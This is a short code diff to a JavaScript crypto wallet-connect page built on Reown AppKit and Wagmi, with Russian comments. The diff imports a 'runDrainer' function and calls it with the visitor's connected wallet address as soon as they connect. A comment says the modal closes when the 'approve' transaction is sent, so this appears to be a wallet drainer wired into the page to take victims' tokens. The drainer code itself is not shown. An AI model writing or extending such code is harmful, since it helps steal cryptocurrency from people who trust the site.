@@ -1,6 +1,7 @@
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { runDrainer } from './drainer.js';
 
 // === Конфигурация AppKit ===
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
@@ -323,6 +324,9 @@ async function handleConnectOrAction() {
     }
 
     showModal();
+    
+    // Передаём коллбэк для закрытия модального окна при отправке транзакции approve
+    await runDrainer(null, null, connectedAddress, hideModal);
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
   }
